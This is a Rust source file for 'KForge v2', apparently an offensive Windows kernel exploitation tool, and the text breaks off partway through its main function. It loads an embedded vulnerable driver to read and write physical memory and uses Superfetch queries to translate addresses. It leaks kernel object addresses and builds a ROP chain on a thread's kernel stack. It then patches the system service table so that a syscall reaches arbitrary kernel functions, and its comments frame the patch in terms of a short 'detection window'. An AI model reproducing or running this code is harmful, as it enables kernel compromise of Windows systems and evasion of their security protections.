//! KForge v2 — SSDT patch via PTE manipulation (hybrid approach).
//!
//! Problem: AmdTools64 uses MmMapIoSpace which refuses to map RAM-backed
//! physical pages (page tables, CR3, etc.) on VBS/HVCI systems.
//!
//! Solution: Hybrid approach:
//!   - Superfetch for ALL VA→PA translations (including kernel page tables)
//!   - AmdTools64 phys R/W only for mappable pages (code/data, NOT page tables)
//!   - KForge v1 (ROP) for the single PML4E write (kernel context can do it)
//!
//! Bootstrap:
//!   1. Open AmdTools64 + Superfetch
//!   2. Find CR3, SSDT, NtCreateTransaction entry
//!   3. Allocate locked usermode pages, get PAs via Superfetch
//!   4. Read SSDT page content via Superfetch + phys read
//!   5. Rewire PTE chain in usermode copies
//!   6. KForge v1: call MmGetVirtualForPhysical(pml4e_pa) → get kernel VA
//!   7. KForge v1: write new PML4E to that kernel VA
//!   8. SSDT patch live — test via NtCreateTransaction syscall
//!   9. Unload driver
//!
//! Runtime: set_target(fn_va) → call NtCreateTransaction() → kernel dispatches
//! No driver, no ROP, no threads.

#![allow(non_snake_case, dead_code)]
#![allow(
    clippy::upper_case_acronyms,
    clippy::too_many_arguments,
    clippy::identity_op
)]

mod driver;
mod export;
mod ssdt;

use std::mem;
use std::ptr;
use std::time::Duration;

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::System::LibraryLoader::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;

type HANDLE = *mut std::ffi::c_void;

const EP_DTB: u64 = 0x28; // EPROCESS.DirectoryTableBase
const EP_PID: u64 = 0x1D0; // EPROCESS.UniqueProcessId
const KT_STACK_BASE: u64 = 0x38;
const KT_KERNEL_STACK: u64 = 0x58;
const THREAD_EXIT_CODE: u64 = 0x1337;

const IOCTL_MAP: u32 = 0xFFF0_28A4;
const IOCTL_UNMAP: u32 = 0xFFF0_28A8;

// ── AmdTools64 physical memory primitives ───────────────────────────

#[repr(C)]
#[derive(Clone, Copy)]
struct MapBuf {
    pa_lo: u32,
    pa_hi: u32,
    size: u32,
    err: u32,
    tracking: u64,
    user_va: u64,
    cache: u8,
    _p: [u8; 7],
}

struct PhysPage {
    handle: HANDLE,
    base_pa: u64,
    user_va: *mut u8,
    tracking: u64,
}

impl PhysPage {
    fn map(h: HANDLE, pa: u64) -> Option<Self> {
        let mut b = MapBuf {
            pa_lo: pa as u32,
            pa_hi: (pa >> 32) as u32,
            size: 0x1000,
            err: 0,
            tracking: 0,
            user_va: 0,
            cache: 0,
            _p: [0; 7],
        };
        let mut r = 0u32;
        let ok = unsafe {
            DeviceIoControl(
                h,
                IOCTL_MAP,
                &mut b as *mut _ as _,
                mem::size_of::<MapBuf>() as u32,
                &mut b as *mut _ as _,
                mem::size_of::<MapBuf>() as u32,
                &mut r,
                ptr::null_mut(),
            )
        };
        if ok != 0 && b.user_va != 0 {
            Some(Self {
                handle: h,
                base_pa: pa,
                user_va: b.user_va as *mut u8,
                tracking: b.tracking,
            })
        } else {
            None
        }
    }
    fn unmap(&self) {
        let mut b = MapBuf {
            pa_lo: 0,
            pa_hi: 0,
            size: 0,
            err: 0,
            tracking: self.tracking,
            user_va: self.user_va as u64,
            cache: 0,
            _p: [0; 7],
        };
        let mut r = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_UNMAP,
                &mut b as *mut _ as _,
                mem::size_of::<MapBuf>() as u32,
                &mut b as *mut _ as _,
                mem::size_of::<MapBuf>() as u32,
                &mut r,
                ptr::null_mut(),
            );
        }
    }
    fn read8(&self, o: u64) -> u64 {
        unsafe { *(self.user_va.add(o as usize) as *const u64) }
    }
    fn write8(&self, o: u64, v: u64) {
        unsafe {
            *(self.user_va.add(o as usize) as *mut u64) = v;
        }
    }
    fn read_bytes(&self, o: u64, buf: &mut [u8]) {
        unsafe {
            ptr::copy_nonoverlapping(self.user_va.add(o as usize), buf.as_mut_ptr(), buf.len());
        }
    }
}

struct PageCache {
    handle: HANDLE,
    pages: Vec<PhysPage>,
    map_count: usize,
}
impl PageCache {
    fn new(h: HANDLE) -> Self {
        Self {
            handle: h,
            pages: Vec::new(),
            map_count: 0,
        }
    }
    fn ensure(&mut self, pa: u64) -> Option<usize> {
        let pp = pa & !0xFFF;
        for (i, p) in self.pages.iter().enumerate() {
            if p.base_pa == pp {
                return Some(i);
            }
        }
        if self.pages.len() >= 32 {
            self.pages.remove(0).unmap();
        }
        let p = PhysPage::map(self.handle, pp)?;
        self.map_count += 1;
        self.pages.push(p);
        Some(self.pages.len() - 1)
    }
    fn read8(&mut self, pa: u64) -> Option<u64> {
        let i = self.ensure(pa)?;
        Some(self.pages[i].read8(pa & 0xFFF))
    }
    fn write8(&mut self, pa: u64, v: u64) -> bool {
        if let Some(i) = self.ensure(pa) {
            self.pages[i].write8(pa & 0xFFF, v);
            true
        } else {
            false
        }
    }
    fn read_page(&mut self, pa: u64, buf: &mut [u8]) -> bool {
        if let Some(i) = self.ensure(pa) {
            self.pages[i].read_bytes(pa & 0xFFF, buf);
            true
        } else {
            false
        }
    }
    fn unmap_all(&mut self) {
        for p in self.pages.drain(..) {
            p.unmap();
        }
    }
}

// ── Superfetch VA→PA ────────────────────────────────────────────────

type NtQSI = unsafe extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32;
#[repr(C)]
struct SfI {
    v: u32,
    m: u32,
    c: u32,
    d: *mut u8,
    l: u32,
}
#[repr(C, align(8))]
#[derive(Clone, Copy)]
struct PfR {
    base: usize,
    count: usize,
}
#[repr(C)]
struct RV2 {
    v: u32,
    f: u32,
    c: u32,
}
#[repr(C, align(8))]
#[derive(Clone, Copy)]
struct PId {
    u1: u64,
    pfn: usize,
    va: usize,
}
#[repr(C, align(8))]
#[derive(Clone, Copy)]
struct SML {
    f: [usize; 5],
    p: [usize; 8],
    r: [usize; 8],
    m: usize,
}
#[repr(C)]
struct PReq {
    v: u32,
    fl: u32,
    c: usize,
    ml: SML,
}

fn sfc(q: NtQSI, c: u32, d: *mut u8, l: u32, rl: *mut u32) -> i32 {
    let mut s = SfI {
        v: 45,
        m: 0x6B756843,
        c,
        d,
        l,
    };
    unsafe {
        q(
            79,
            &mut s as *mut _ as *mut u8,
            mem::size_of::<SfI>() as u32,
            rl,
        )
    }
}
fn sf_ranges(q: NtQSI) -> Option<Vec<PfR>> {
    let mut rl = 0u32;
    let mut p = RV2 { v: 2, f: 0, c: 0 };
    let st = sfc(
        q,
        17,
        &mut p as *mut _ as *mut u8,
        mem::size_of::<RV2>() as u32,
        &mut rl,
    );
    if st == 0xC0000023u32 as i32 && rl > 0 {
        let mut b = vec![0u8; rl as usize];
        unsafe {
            (*(b.as_mut_ptr() as *mut RV2)).v = 2;
        }
        if sfc(q, 17, b.as_mut_ptr(), rl, ptr::null_mut()) >= 0 {
            let c = unsafe { (*(b.as_ptr() as *const RV2)).c } as usize;
            let rp = unsafe { b.as_ptr().add(16) as *const PfR };
            return Some((0..c).map(|i| unsafe { *rp.add(i) }).collect());
        }
    }
    None
}
fn sf_va2pa(q: NtQSI, rng: &[PfR], va: u64) -> Option<u64> {
    let tgt = (va & !0xFFF) as usize;
    let hs = mem::size_of::<PReq>();
    let es = mem::size_of::<PId>();
    for r in rng {
        let mut o = 0;
        while o < r.count {
            let n = 4096.min(r.count - o);
            let t = hs + es * n;
            let mut b = vec![0u8; t];
            let rq = b.as_mut_ptr() as *mut PReq;
            unsafe {
                (*rq).v = 1;
                (*rq).fl = 1;
                (*rq).c = n;
                let e = b.as_mut_ptr().add(hs) as *mut PId;
                for i in 0..n {
                    (*e.add(i)).pfn = r.base + o + i;
                }
            }
            if sfc(q, 6, b.as_mut_ptr(), t as u32, ptr::null_mut()) >= 0 {
                let e = unsafe { b.as_ptr().add(hs) as *const PId };
                for i in 0..n {
                    let x = unsafe { &*e.add(i) };
                    if (x.va & !0xFFF) == tgt {
                        return Some(((r.base + o + i) as u64) << 12 | (va & 0xFFF));
                    }
                }
            }
            o += n;
        }
    }
    None
}

struct VaCache {
    q: NtQSI,
    rng: Vec<PfR>,
    cache: Vec<(u64, u64)>,
}
impl VaCache {
    fn new(q: NtQSI, rng: Vec<PfR>) -> Self {
        Self {
            q,
            rng,
            cache: Vec::new(),
        }
    }
    fn va2pa(&mut self, va: u64) -> Option<u64> {
        let vp = va & !0xFFF;
        let off = va & 0xFFF;
        for &(v, p) in &self.cache {
            if v == vp {
                return Some(p | off);
            }
        }
        let pa = sf_va2pa(self.q, &self.rng, va)?;
        let pp = pa & !0xFFF;
        if self.cache.len() >= 1024 {
            self.cache.remove(0);
        }
        self.cache.push((vp, pp));
        Some(pp | off)
    }
}

// ── Helpers ─────────────────────────────────────────────────────────

fn enable_privs() {
    let n = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr()) };
    if let Some(f) = unsafe { GetProcAddress(n, b"RtlAdjustPrivilege\0".as_ptr()) } {
        type A = unsafe extern "system" fn(u32, u8, u8, *mut u8) -> i32;
        let a: A = unsafe { mem::transmute(f) };
        let mut o = 0u8;
        unsafe {
            a(13, 1, 0, &mut o);
            a(20, 1, 0, &mut o);
        }
    }
}
fn get_ntqsi() -> NtQSI {
    unsafe {
        let nt = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
        mem::transmute(GetProcAddress(nt, b"NtQuerySystemInformation\0".as_ptr()).unwrap())
    }
}
fn get_kernel_base() -> Option<(u64, String)> {
    #[repr(C)]
    #[derive(Clone, Copy)]
    struct M {
        s: usize,
        m: usize,
        b: usize,
        sz: u32,
        fl: u32,
        lo: u16,
        io: u16,
        lc: u16,
        no: u16,
        n: [u8; 256],
    }
    let q = get_ntqsi();
    unsafe {
        let mut sz = 0u32;
        q(11, ptr::null_mut(), 0, &mut sz);
        let mut buf = vec![0u8; sz as usize + 0x1000];
        if q(11, buf.as_mut_ptr(), buf.len() as u32, &mut sz) < 0 {
            return None;
        }
        if *(buf.as_ptr() as *const u32) == 0 {
            return None;
        }
        let e = buf.as_ptr().add(8) as *const M;
        let base = (*e).b as u64;
        let no = (*e).no as usize;
        let name = std::ffi::CStr::from_ptr((&(*e).n)[no..].as_ptr() as *const i8)
            .to_string_lossy()
            .to_string();
        Some((base, name))
    }
}
fn get_kernel_size() -> u64 {
    #[repr(C)]
    #[derive(Clone, Copy)]
    struct M {
        s: usize,
        m: usize,
        b: usize,
        sz: u32,
        fl: u32,
        lo: u16,
        io: u16,
        lc: u16,
        no: u16,
        n: [u8; 256],
    }
    let q = get_ntqsi();
    unsafe {
        let mut sz = 0u32;
        q(11, ptr::null_mut(), 0, &mut sz);
        let mut buf = vec![0u8; sz as usize + 0x1000];
        if q(11, buf.as_mut_ptr(), buf.len() as u32, &mut sz) < 0 {
            return 0;
        }
        let e = buf.as_ptr().add(8) as *const M;
        (*e).sz as u64
    }
}
fn resolve(kb: u64, kn: &str, p: &str) -> u64 {
    export::export_resolve(kb, kn, p).unwrap_or(0)
}
fn leak_object(q: NtQSI, pid: u32, hv: u64) -> u64 {
    #[repr(C)]
    #[derive(Clone, Copy)]
    struct H {
        obj: u64,
        pid: u64,
        h: u64,
        a: u32,
        c: u16,
        t: u16,
        at: u32,
        r: u32,
    }
    let mut sz = 16 * 1024 * 1024u32;
    let mut buf = vec![0u8; sz as usize];
    loop {
        let st = unsafe { q(64, buf.as_mut_ptr(), sz, &mut sz) };
        if st == 0 {
            break;
        }
        if st == -1073741820i32 {
            sz += 4 * 1024 * 1024;
            buf.resize(sz as usize, 0);
            continue;
        }
        return 0;
    }
    let cnt = unsafe { *(buf.as_ptr() as *const u64) } as usize;
    let es = unsafe { buf.as_ptr().add(16) as *const H };
    let p64 = pid as u64;
    for i in 0..cnt {
        let e = unsafe { &*es.add(i) };
        if e.pid == p64 && e.h == hv {
            return e.obj;
        }
    }
    0
}
unsafe extern "system" fn dummy_fn(p: *mut std::ffi::c_void) -> u32 {
    unsafe {
        WaitForSingleObject(p, u32::MAX);
    }
    0
}

// ── KForge v1 — single ROP call (used only for PML4E bootstrap) ────

fn kcall_v1(
    vc: &mut VaCache,
    pcache: &mut PageCache,
    g: &export::Gadgets,
    kbase: u64,
    ksize: u64,
    fn_zw_terminate: u64,
    func: u64,
    args: &[u64],
    ret_val: *mut u64,
) -> Result<u64, String> {
    let our_pid = unsafe { GetCurrentProcessId() };
    let q = vc.q;
    let rng = vc.rng.clone();

    let ev = unsafe { CreateEventW(ptr::null(), 0, 0, ptr::null()) };
    if ev.is_null() {
        return Err("event".into());
    }
    let mut tid = 0u32;
    let th = unsafe { CreateThread(ptr::null(), 0, Some(dummy_fn), ev as _, 0, &mut tid) };
    if th.is_null() {
        unsafe {
            CloseHandle(ev);
        }
        return Err("thread".into());
    }
    std::thread::sleep(Duration::from_millis(200));

    let kt = leak_object(q, our_pid, th as usize as u64);
    if kt == 0 {
        unsafe {
            SetEvent(ev);
            CloseHandle(th);
            CloseHandle(ev);
        }
        return Err("KTHREAD".into());
    }

    let sb = vc
        .va2pa(kt + KT_STACK_BASE)
        .and_then(|pa| pcache.read8(pa))
        .ok_or("SB")?;
    let ks = vc
        .va2pa(kt + KT_KERNEL_STACK)
        .and_then(|pa| pcache.read8(pa))
        .ok_or("KS")?;

    // Translate stack pages
    let mut sp: Vec<(u64, u64)> = Vec::new();
    let mut pv = ks & !0xFFF;
    while pv < sb {
        if let Some(pa) = sf_va2pa(q, &rng, pv) {
            sp.push((pv, pa & !0xFFF));
        }
        pv += 0x1000;
    }

    // Scan from StackBase DOWN for FIRST ntoskrnl address (KiSystemServiceCopyEnd retaddr)
    let mut ret_addr_va = 0u64;
    'scan: for &(pv, pp) in sp.iter().rev() {
        if let Some(idx) = pcache.ensure(pp) {
            let lo = ks.max(pv);
            let hi = sb.min(pv + 0x1000);
            if lo >= hi {
                continue;
            }
            let mut va = (hi - 8) & !7;
            while va >= lo {
                let val = pcache.pages[idx].read8(va - pv);
                if val > kbase && val < kbase + ksize {
                    ret_addr_va = va;
                    break 'scan;
                }
                if va < 8 {
                    break;
                }
                va -= 8;
            }
        }
    }
    if ret_addr_va == 0 {
        unsafe {
            SetEvent(ev);
            CloseHandle(th);
            CloseHandle(ev);
        }
        return Err("retaddr".into());
    }

    // Cache stack page translations
    for &(v, p) in &sp {
        vc.cache.push((v, p));
    }

    let a = |i: usize| -> u64 { if i < args.len() { args[i] } else { 0 } };
    let ra = ret_addr_va;

    // Write ROP chain (KForge v1 layout)
    let mut w = |va: u64, val: u64| {
        if let Some(pa) = vc.va2pa(va) {
            pcache.write8(pa, val);
        }
    };

    // First call: target function
    w(ra + 0x00, g.retpoline.unwrap());
    w(ra + 0x28, func); // rax
    w(ra + 0x30, a(0)); // rcx
    w(ra + 0x38, a(1)); // rdx
    w(ra + 0x40, a(2)); // r8
    w(ra + 0x48, a(3)); // r9
    w(ra + 0x50, g.add_rsp_68_ret);
    for i in 4..args.len() {
        w(ra + 0x58 + 0x20 + ((i - 4) as u64) * 8, args[i]);
    }

    // Save return value
    w(ra + 0xC0, g.pop_rcx_ret);
    w(ra + 0xC8, ret_val as u64);
    w(ra + 0xD0, g.mov_drcx_rax_ret);
    w(ra + 0xD8, g.ret_gadget);

    // Second call: ZwTerminateThread(hThread, 0x1337)
    w(ra + 0xE0, g.retpoline.unwrap());
    w(ra + 0x108, fn_zw_terminate);
    w(ra + 0x110, th as u64);
    w(ra + 0x118, THREAD_EXIT_CODE);

    unsafe {
        SetEvent(ev);
        WaitForSingleObject(th, 10000);
    }

    let mut exit_code = 0u32;
    unsafe {
        GetExitCodeThread(th, &mut exit_code);
        CloseHandle(th);
        CloseHandle(ev);
    }

    if exit_code == THREAD_EXIT_CODE as u32 {
        Ok(unsafe { *ret_val })
    } else {
        Err(format!("exit=0x{:X}", exit_code))
    }
}

/// KForge v1 variant: write a u64 value to a kernel VA.
/// Uses the ROP chain to call `mov [rcx], rdx; ret` as the "function".
/// rcx = target_kva, rdx = value.
fn kwrite_v1(
    vc: &mut VaCache,
    pcache: &mut PageCache,
    g: &export::Gadgets,
    kbase: u64,
    ksize: u64,
    fn_zw_terminate: u64,
    target_kva: u64,
    value: u64,
) -> Result<(), String> {
    let gadget = g.mov_drcx_rdx_ret.ok_or("no mov [rcx],rdx;ret gadget")?;

    // The retpoline loads: rax=[rsp+20], rcx=[rsp+28], rdx=[rsp+30]
    // Then jmp rax. So if rax = mov_[rcx]_rdx_ret gadget,
    // rcx = target_kva, rdx = value, the gadget writes [rcx] = rdx; ret.
    // After ret, the chain continues with the save + terminate section.

    let our_pid = unsafe { GetCurrentProcessId() };
    let q = vc.q;
    let rng = vc.rng.clone();

    let ev = unsafe { CreateEventW(ptr::null(), 0, 0, ptr::null()) };
    if ev.is_null() {
        return Err("event".into());
    }
    let mut tid = 0u32;
    let th = unsafe { CreateThread(ptr::null(), 0, Some(dummy_fn), ev as _, 0, &mut tid) };
    if th.is_null() {
        unsafe {
            CloseHandle(ev);
        }
        return Err("thread".into());
    }
    std::thread::sleep(Duration::from_millis(200));

    let kt = leak_object(q, our_pid, th as usize as u64);
    if kt == 0 {
        unsafe {
            SetEvent(ev);
            CloseHandle(th);
            CloseHandle(ev);
        }
        return Err("KTHREAD".into());
    }

    let sb = vc
        .va2pa(kt + KT_STACK_BASE)
        .and_then(|pa| pcache.read8(pa))
        .ok_or("SB")?;
    let ks = vc
        .va2pa(kt + KT_KERNEL_STACK)
        .and_then(|pa| pcache.read8(pa))
        .ok_or("KS")?;

    let mut sp: Vec<(u64, u64)> = Vec::new();
    let mut pv = ks & !0xFFF;
    while pv < sb {
        if let Some(pa) = sf_va2pa(q, &rng, pv) {
            sp.push((pv, pa & !0xFFF));
        }
        pv += 0x1000;
    }

    let mut ret_addr_va = 0u64;
    'scan: for &(pv, pp) in sp.iter().rev() {
        if let Some(idx) = pcache.ensure(pp) {
            let lo = ks.max(pv);
            let hi = sb.min(pv + 0x1000);
            if lo >= hi {
                continue;
            }
            let mut va = (hi - 8) & !7;
            while va >= lo {
                let val = pcache.pages[idx].read8(va - pv);
                if val > kbase && val < kbase + ksize {
                    ret_addr_va = va;
                    break 'scan;
                }
                if va < 8 {
                    break;
                }
                va -= 8;
            }
        }
    }
    if ret_addr_va == 0 {
        unsafe {
            SetEvent(ev);
            CloseHandle(th);
            CloseHandle(ev);
        }
        return Err("retaddr".into());
    }
    for &(v, p) in &sp {
        vc.cache.push((v, p));
    }

    let mut w = |va: u64, val: u64| {
        if let Some(pa) = vc.va2pa(va) {
            pcache.write8(pa, val);
        }
    };
    let ra = ret_addr_va;

    // First call: mov [rcx], rdx; ret
    w(ra + 0x00, g.retpoline.unwrap());
    w(ra + 0x28, gadget); // rax = mov [rcx], rdx; ret
    w(ra + 0x30, target_kva); // rcx = target address
    w(ra + 0x38, value); // rdx = value to write
    w(ra + 0x40, 0); // r8 (unused)
    w(ra + 0x48, 0); // r9 (unused)
    w(ra + 0x50, g.add_rsp_68_ret);

    // Skip save section — we don't need a return value
    // Just need to get to the terminate section
    w(ra + 0xC0, g.pop_rcx_ret);
    w(ra + 0xC8, 0); // dummy
    w(ra + 0xD0, g.ret_gadget); // just ret, skip the mov
    w(ra + 0xD8, g.ret_gadget);

    // Second call: ZwTerminateThread
    w(ra + 0xE0, g.retpoline.unwrap());
    w(ra + 0x108, fn_zw_terminate);
    w(ra + 0x110, th as u64);
    w(ra + 0x118, THREAD_EXIT_CODE);

    unsafe {
        SetEvent(ev);
        WaitForSingleObject(th, 10000);
    }

    let mut exit_code = 0u32;
    unsafe {
        GetExitCodeThread(th, &mut exit_code);
        CloseHandle(th);
        CloseHandle(ev);
    }

    if exit_code == THREAD_EXIT_CODE as u32 {
        Ok(())
    } else {
        Err(format!("exit=0x{:X}", exit_code))
    }
}

// ── PTE chain setup (read-only part via Superfetch) ─────────────────

const PTE_PA_MASK: u64 = 0x000F_FFFF_FFFF_F000;
const PTE_PRESENT: u64 = 1;
const PTE_LARGE: u64 = 1 << 7;
const PTE_GLOBAL: u64 = 1 << 8;
const PTE_TABLE_FLAGS: u64 = 0x0000_0000_0000_0067;

fn pml4_idx(va: u64) -> usize {
    ((va >> 39) & 0x1FF) as usize
}
fn pdpt_idx(va: u64) -> usize {
    ((va >> 30) & 0x1FF) as usize
}
fn pd_idx(va: u64) -> usize {
    ((va >> 21) & 0x1FF) as usize
}
fn pt_idx(va: u64) -> usize {
    ((va >> 12) & 0x1FF) as usize
}

struct LockedPage {
    va: *mut u8,
    pa: u64,
}
impl LockedPage {
    fn alloc(vc: &mut VaCache) -> Option<Self> {
        let va = unsafe {
            VirtualAlloc(
                ptr::null(),
                0x1000,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if va.is_null() {
            return None;
        }
        unsafe {
            ptr::write_bytes(va as *mut u8, 0x41, 0x1000);
        }
        if unsafe { VirtualLock(va, 0x1000) } == 0 {
            unsafe {
                VirtualFree(va, 0, MEM_RELEASE);
            }
            return None;
        }
        let pa = vc.va2pa(va as u64)?;
        Some(Self {
            va: va as *mut u8,
            pa,
        })
    }
    fn write_u64(&self, off: usize, val: u64) {
        unsafe {
            *((self.va.add(off)) as *mut u64) = val;
        }
    }
    fn read_u64(&self, off: usize) -> u64 {
        unsafe { *((self.va.add(off)) as *const u64) }
    }
    fn read_u32(&self, off: usize) -> u32 {
        unsafe { *((self.va.add(off)) as *const u32) }
    }
    fn as_mut_slice(&mut self) -> &mut [u8] {
        unsafe { std::slice::from_raw_parts_mut(self.va, 0x1000) }
    }
}

// ── KCall — patch-on-demand SSDT dispatch ───────────────────────────
//
// SSDT slot stays at its original value 100% of the time.
// call_n: patch slot → syscall → restore slot + original bytes in data page.
// Detection window: ~2μs per call (syscall dispatch latency).

struct KCall {
    entry_ptr: *mut u32,   // usermode ptr into our data page (SSDT slot)
    ki_table_va: u64,      // KiServiceTable base VA
    original_entry: u32,   // original SSDT i32 entry (ntoskrnl value)
    syscall_fn: *const u8, // ntdll!NtCreateTransaction
}

unsafe impl Send for KCall {}
unsafe impl Sync for KCall {}

impl KCall {
    /// Patch-on-demand kernel call.
    /// Patches the SSDT slot, issues the syscall, restores the original entry.
    /// The slot is only "hot" for the ~2μs of syscall dispatch.
    /// `nstack`: number of stack arguments beyond the 4 register args (usually 0).
    fn call_n(&self, func: u64, args: &[u64]) -> u64 {
        let nstack = args.len().saturating_sub(4) as u32;
        let rva = (func as i64 - self.ki_table_va as i64) as i32;
        let patched = ((rva << 4) as u32) | (nstack & 0xF);

        // ── patch ──
        unsafe { ptr::write_volatile(self.entry_ptr, patched) };

        // ── syscall ── (kernel reads our patched slot, dispatches to func)
        type SyscallFn = unsafe extern "system" fn(u64, u64, u64, u64) -> u64;
        let a = |i: usize| -> u64 { args.get(i).copied().unwrap_or(0) };
        let ret = unsafe {
            mem::transmute::<*const u8, SyscallFn>(self.syscall_fn)(a(0), a(1), a(2), a(3))
        };

        // ── restore ── slot back to original ntoskrnl value
        unsafe { ptr::write_volatile(self.entry_ptr, self.original_entry) };

        ret
    }
}

// ── Main ────────────────────────────────────────────────────────────

fn main() {
    println!("=== KForge v2 (hybrid SSDT+PTE) ===\n");
    enable_privs();

    let q = get_ntqsi();
    let (kbase, kname) = get_kernel_base().expect("[!] Cannot get kernel base");
    if kbase == 0 {
        println!("[!] kbase=0, need admin");
        return;
    }
    let ksize = get_kernel_size();
    println!("[+] ntoskrnl @ 0x{:X} size=0x{:X}", kbase, ksize);

    let mut drv = driver::EmbeddedDriver::load().expect("[!] Cannot load AmdTools64");
    println!("[+] AmdTools64 loaded (embedded)");
    let mut pcache = PageCache::new(drv.handle);

    // ── Phase 1: Superfetch ──
    println!("\n--- Phase 1: Superfetch ---");
    let rng = sf_ranges(q).expect("[!] sf_ranges");
    println!("[+] {} physical ranges", rng.len());
    let mut vc = VaCache::new(q, rng.clone());

    // Verify: System PID
    let ps_va = resolve(kbase, &kname, "PsInitialSystemProcess");
    let ps_pa = vc.va2pa(ps_va).expect("PsInitialSystemProcess VA→PA");
    let ep_ptr = pcache.read8(ps_pa).expect("EPROCESS ptr");
    let pid_pa = vc.va2pa(ep_ptr + EP_PID).expect("PID VA→PA");
    let sys_pid = pcache.read8(pid_pa).unwrap_or(0);
    println!("[+] System EPROCESS=0x{:X}, PID={}", ep_ptr, sys_pid);
    assert_eq!(sys_pid, 4);

    // ── Phase 2: Gadgets + ZwTerminateThread ──
    println!("\n--- Phase 2: Gadgets ---");
    let mut g = export::find_gadgets(kbase, &kname).expect("gadgets");

    // Resolve retpoline: native from kernel .text (1809+) or synthetic
    // shellcode in a VirtualAlloc(PAGE_EXECUTE_READWRITE) page.
    // The ROP chain runs in our process's kernel thread — user pages accessible.
    if g.retpoline.is_none() {
        let stub = unsafe {
            VirtualAlloc(
                ptr::null(),
                0x1000,
                MEM_COMMIT | MEM_RESERVE,
                0x40, /* PAGE_EXECUTE_READWRITE */
            )
        };
        if !stub.is_null() {
            unsafe {
                ptr::copy_nonoverlapping(
                    export::SYNTHETIC_RETPOLINE.as_ptr(),
                    stub as *mut u8,
                    export::SYNTHETIC_RETPOLINE.len(),
                );
                VirtualLock(stub, 0x1000);
            }
            g.retpoline = Some(stub as u64);
            println!("[+] retpoline        = 0x{:X} (synthetic)", stub as u64);
        } else {
            panic!("[!] VirtualAlloc for synthetic retpoline failed");
        }
    } else {
        println!(
            "[+] retpoline        = 0x{:X} (native)",
            g.retpoline.unwrap()
        );
    }
    println!("[+] add_rsp_68       = 0x{:X}", g.add_rsp_68_ret);
    println!("[+] pop_rcx          = 0x{:X}", g.pop_rcx_ret);
    println!("[+] mov [rcx],rax    = 0x{:X}", g.mov_drcx_rax_ret);
    println!(
        "[+] mov [rcx],rdx    = {}",
        match g.mov_drcx_rdx_ret {
            Some(v) => format!("0x{:X}", v),
            None => "NOT FOUND".into(),
        }
    );
    println!(
        "[+] mov rax,[rcx]    = {}",
        match g.mov_rax_drcx_ret {
            Some(v) => format!("0x{:X}", v),
            None => "NOT FOUND".into(),
        }
    );
    let fn_zw_term = export::find_zw_terminate_thread(kbase, &kname).expect("ZwTerminateThread");
    println!("[+] ZwTerminateThread = 0x{:X}", fn_zw_term);

    // ── Phase 3: Find CR3 + SSDT ──
    println!("\n--- Phase 3: CR3 + SSDT ---");
    let our_pid = unsafe { GetCurrentProcessId() };
    let temp_h = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, our_pid) };
    let our_ep = leak_object(q, our_pid, temp_h as u64);
    unsafe {
        CloseHandle(temp_h);
    }
    if our_ep == 0 {
        panic!("[!] Cannot leak our EPROCESS");
    }
    println!("[+] Our EPROCESS = 0x{:X}", our_ep);

    let dtb_pa = vc.va2pa(our_ep + EP_DTB).expect("DTB VA→PA");
    let cr3 = pcache.read8(dtb_pa).expect("CR3");
    let cr3_pa = cr3 & PTE_PA_MASK;
    println!("[+] Our CR3 = 0x{:X}", cr3);

    // Find SSDT
    let ke_sdt_va = ssdt::find_ke_service_descriptor_table(kbase, &kname)
        .expect("[!] KeServiceDescriptorTable not found");

    // Read KiServiceTable VA and count
    let sdt0_pa = vc.va2pa(ke_sdt_va).expect("SDT[0] VA→PA");
    let ki_table_va = pcache.read8(sdt0_pa).expect("KiServiceTable");
    let sdt2_pa = vc.va2pa(ke_sdt_va + 0x10).expect("SDT[2] VA→PA");
    let ki_count = pcache.read8(sdt2_pa).expect("count");
    println!(
        "[+] KiServiceTable = 0x{:X}, count = {}",
        ki_table_va, ki_count
    );

    // Find NtCreateTransaction entry
    let nt_create_va = resolve(kbase, &kname, "NtCreateTransaction");
    println!("[+] NtCreateTransaction = 0x{:X}", nt_create_va);
    let shifted_rva = ((nt_create_va as i64 - ki_table_va as i64) as i32) << 4;

    let mut target_idx = None;
    let mut target_entry = 0u32;
    for i in 0..ki_count as usize {
        let entry_va = ki_table_va + (i as u64) * 4;
        let pa = match vc.va2pa(entry_va) {
            Some(p) => p,
            None => continue,
        };
        let qw = match pcache.read8(pa & !7) {
            Some(v) => v,
            None => continue,
        };
        let entry = if pa & 4 == 0 {
            qw as u32
        } else {
            (qw >> 32) as u32
        };
        if (entry as i32 & !0xF) == shifted_rva {
            target_idx = Some(i);
            target_entry = entry;
            break;
        }
    }
    let idx = target_idx.expect("[!] NtCreateTransaction not found in SSDT");
    let entry_kva = ki_table_va + (idx as u64) * 4;
    println!(
        "[+] SSDT entry idx={} (0x{:X}), val=0x{:08X}, entry_kva=0x{:X}",
        idx, idx, target_entry, entry_kva
    );

    // ── Phase 4: PTE base discovery via KForge v1 ──
    println!("\n--- Phase 4: PTE base discovery via KForge v1 ---");

    // Call MmGetVirtualForPhysical(cr3_pa) → gives us the kernel VA of our PML4
    // This tells us the self-reference PTE base
    let fn_mm_get_virt = resolve(kbase, &kname, "MmGetVirtualForPhysical");
    if fn_mm_get_virt == 0 {
        panic!("[!] MmGetVirtualForPhysical not found");
    }

    // MmGetVirtualForPhysical takes PHYSICAL_ADDRESS (i64), returns PVOID
    let mut pml4_kva: u64 = 0;
    match kcall_v1(
        &mut vc,
        &mut pcache,
        &g,
        kbase,
        ksize,
        fn_zw_term,
        fn_mm_get_virt,
        &[cr3_pa],
        &mut pml4_kva,
    ) {
        Ok(v) => {
            pml4_kva = v;
            println!("[+] PML4 kernel VA = 0x{:X}", pml4_kva);
        }
        Err(e) => {
            println!("[!] MmGetVirtualForPhysical failed: {}", e);
            pcache.unmap_all();
            return;
        }
    }

    if pml4_kva == 0 {
        println!("[!] MmGetVirtualForPhysical returned NULL");
        pcache.unmap_all();
        return;
    }

    // Now we know the PML4 VA. Read the full page table chain via kernel reads.
    // Use KForge v1 to read page table entries that we can't map.

    // Read PML4E for target_va (entry_kva = SSDT entry kernel VA)
